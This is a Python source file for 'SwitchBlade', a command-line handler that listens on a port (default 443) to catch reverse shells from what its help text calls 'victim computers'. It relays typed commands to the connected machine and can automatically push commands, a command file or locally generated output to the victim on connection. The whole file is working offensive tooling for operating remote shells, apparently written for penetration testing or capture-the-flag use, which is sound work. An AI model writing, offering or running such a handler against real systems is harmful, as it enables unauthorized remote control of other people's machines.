#!/bin/env python3
# SwitchBlade - a python based TCP/IP handler for remote connections
# It's not as versatile as the Swiss-Army knife, but it's real good for stabbin'
# Author: Connor Gannon (Gin&Miskatonic)
# Init Date: 14 Nov 2018
#
import sys
import os
import time
import socket
import threading

import prompt_toolkit
from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout
import argparse

import nclib
from nclib.errors import NetcatError, NetcatTimeout

import re

import shlex
import subprocess

ansi_escape = re.compile('\x1b[^m\x07]*[m\x07]')


class Switchblade:
    
    def __init__(self, args):
        self.args = args
        if self.args.verbosity > 0:
            print ("Listening on {}:{}".format(args.bind, args.port))
        self.nc = nclib.Netcat(listen=(args.bind, args.port), log_send=args.log_send, log_recv=args.log_recv)
        if self.args.verbosity > 0:
            print("Connection from: {}:{}".format(self.get_raddr()[0], self.get_raddr()[1]))
        self.assume_prompt = True
        self.prompt_str = ""
        self.prompt_suffix = "" # last 2 characters of the prompt, usually "# "
        self.esc = ":"
        self._setup_builtins()
        if self.args.welcome_msg:
            self.send(self.args.welcome_msg)
        if self.args.welcome_file:
            with open(self.args.welcome_file, 'rb') as f:
                self.send(f.read(), suffix=b'')
        if self.args.welcome_cmd:
            raddr = self.get_raddr()
            self.args.welcome_cmd = self.args.welcome_cmd.replace('{RHOST}', raddr[0]).replace('{RPORT}', str(raddr[1]))
            self.run(shlex.split(self.args.welcome_cmd))

    @staticmethod
    def get_parser():
        parser = argparse.ArgumentParser(description='A smart handler to catch reverse shells from victim computers.')
        parser.add_argument('-p', '--port', default=443, type=int, required=False, help="The port on which switchblade will listen. The default is 443")
        parser.add_argument('-b', '--bind', default="0.0.0.0", help="The address switchblade should bind to. Default is 0.0.0.0")
        parser.add_argument('-w', '--welcome_msg', help="A message (*cough* command *cough*) That should be sent to the remote machine upon connection. Can be combined with -f and -s")
        parser.add_argument('-f', '--welcome_file', help="A file containing commands that should be sent to the remote machine. Can be combined with -w and -s.")
        parser.add_argument('-c', '--welcome_cmd', help="A shell command that should be executed locally upon connection. The output is sent to the remote machine. Can be combined with -w and -f." + 
                                                        "  Strings {RHOST} and {RPORT} in welcome_cmd will be replaced with the remote IP address and the remote port used by the client.")
        parser.add_argument('-u', '--udp', action="store_true", help="Use UDP instead of TCP. [NOT IMPLEMENTED]")
        parser.add_argument('--log_send', type=str, required=False, help="A filepath to log raw data sent.")
        parser.add_argument('--log_recv', type=str, required=False, help="A filepath to log raw data received.")
        parser.add_argument("-v", "--verbosity", default=0, action="count", help="Level of verbosity. Use -vv or -vvv for additional verbosity")
        return parser

    @staticmethod
    def to_bytes(s):
        if type(s) is str:
            return s.encode()
        else:
            return s

    def _setup_builtins(self):
        self.builtins = [
            {'cmd':'help',
             'desc':'Display this help menu.',
             'usage':'{}help'.format(self.esc)
            }, 
            {'cmd':'clear',
             'desc':'Clear the screen locally.',
             'usage':'{}clear'.format(self.esc)
            }, 
            {'cmd':'send',
             'desc':'send the contents of a file on the local machine and send it to the remote client.',
             'usage':'{}send ~/cmds.list'.format(self.esc)
            }, 
            {'cmd':'sessions',
             'desc':'Show all active sessions.',
             'usage':'{}sessions'.format(self.esc)
            }, 
            {'cmd':'interact',
             'desc':'Interact / attach to a particular session by ID.',
             'usage':'{}interact <Session ID>'.format(self.esc)
            }, 
            {'cmd':'stats',
             'desc':'Print statistics about this session.',
             'usage':'{}stats'.format(self.esc)
            }, 
            {'cmd':'run',
             'desc':'Run the command locally, sending the raw results (STDOUT) to the remote client. A newline will not be added if none is present, so you may need to press enter manually to run the command.',
             'usage':'{}run /path/to/exe -args'.format(self.esc)
            }, 
            {'cmd':'exit',
             'desc':'Exit switchblade. Use exit -y to kill all background sessions.',
             'usage':'{0}exit\n{0}exit -y'.format(self.esc)
            }, 
        ]
    def get_raddr(self):
        return self.nc.sock.getpeername()
 
    def set_prompt(self, prompt):
        self.prompt_str = ansi_escape.sub('', prompt)

    def help(self, cmd):
        for d in self.builtins:
            print('-'*80)
            print("Command - {}".format(d['cmd']))
            print('*'*60)
            print(d['desc'])
            print('*'*60)
            print("Example Usage - \n\n{}".format(d['usage']))
            #for k,v in d.items():
            #    print("{0}\n{2}\n{1}\n{2}".format(k,v,'*'*60))
            print("")

    def sessions(self, cmd):
        print("Not implemented")

    def source(self, cmd):
        print("Not implemented")

    def interact(self, cmd):
        print("Not implemented")

    def stats(self, cmd):
        print("Not implemented")

    def clear(self, cmd):
        prompt_toolkit.shortcuts.clear()        

    def run(self, cmd):
        cmd = subprocess.list2cmdline(cmd) #' '.join([shlex.quote(c) for c in cmd])
        if self.args.verbosity > 0:
            print("Running: {}".format(cmd))
        p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        if p.stderr:
            print("-----ERROR IN RUN-----")
            print(p.stderr.decode())
            print('-'*20)
        if p.stdout:
            if self.args.verbosity > 0:
                print("-----SENDING-----")
                print(p.stdout.decode())
                print('-'*20)
            self.send(p.stdout, suffix=b'')

    def exit(self, cmd):
        #TODO: Give a warning if there are background sessions
        os._exit(0)

    def handle_builtin(self, cmd):
        # If it is a real command, call the right method
        supported = [b['cmd'] for b in self.builtins]
        try:
            split_cmd = shlex.split(cmd)
        except Exception as e:
            print(e)
            self.help(cmd)
            return

        #print("{} in {}?  {}".format(cmd, supported, cmd in supported)
        if split_cmd[0] in supported:
           getattr(self, split_cmd[0])(split_cmd[1:])
        else:
            print("Invalid command {}".format(cmd))
            self.help(cmd)
    
    def send(self,cmd, suffix="\n"):
        cmd = self.to_bytes(cmd+suffix)
        self._send(cmd)

    def _send(self,cmd):
        self.nc.send(cmd)

    def _recv(self):
        return self.nc.recv()

    def recv(self):
        msg = self._recv()
        # Keep the data binary, just print a text representation to the screen
        return msg

    def recv_forever(self):
        while True:
            try:
                msg = self.recv()
                if self.args.verbosity > 2: 
                    print("msg: {}".format(msg))
                msg_str = msg.decode(errors="ignore")
                if len(msg) != len(msg.decode(errors="ignore")):
                    print("Decoding error: {} chars removed".format(len(msg) - len(msg.decode(errors="ignore"))))

                if self.args.verbosity > 2: 
                    print("Received {} chars".format(len(msg)))

                if self.assume_prompt:
                    split = msg_str.rsplit("\n", 1)
                    if not self.prompt_suffix or split[-1].endswith(self.prompt_suffix):
                        self.prompt_suffix = split[-1][-2:]
                        self.set_prompt(split[-1])
                        # If there isn't actually a prompt, this is very, very dangerous
                        if len(split) > 1:
                            msg_str = split[0]+'\n'
                        else:
                            # we set it to the prompt_str already. Not safe, but okay
                            msg_str = ""
                if self.args.verbosity > 2: 
                    print("msg_str: {}".format(msg_str))
                print(msg_str, end="")
            except Exception as e:
                print("recv machine broke.")
                import traceback
                traceback.print_last()

    def listener(self):
        self.session = PromptSession()
        recv_thread = threading.Thread(target=self.recv_forever)
        recv_thread.daemon = True
        try:
            recv_thread.start()
            while True:
                with patch_stdout():
                    if self.assume_prompt:
                        # Slight delay in case the prompt changed
                        time.sleep(0.25)
                        if not self.prompt_str:
                            if self.args.verbosity > 1: 
                                print("Waiting to receive prompt for RHOST...")
                            time.sleep(1)
                            if not self.prompt_str:
                                if self.args.verbosity > 1: 
                                    print("Using default prompt (#)")
                                self.set_prompt('#')
                                self.assume_prompt = False
                    cmd = self.session.prompt(str(self.prompt_str))
                    if cmd.startswith(self.esc):
                        self.handle_builtin(cmd[len(self.esc):])
                        continue
                    self.send(cmd)
        except (socket.error, NetcatError):
            print("send machine broke.")
        self.nc.close()

if __name__=="__main__":
    parser = Switchblade.get_parser()
    sb = Switchblade(parser.parse_args()) 
    sb.listener()
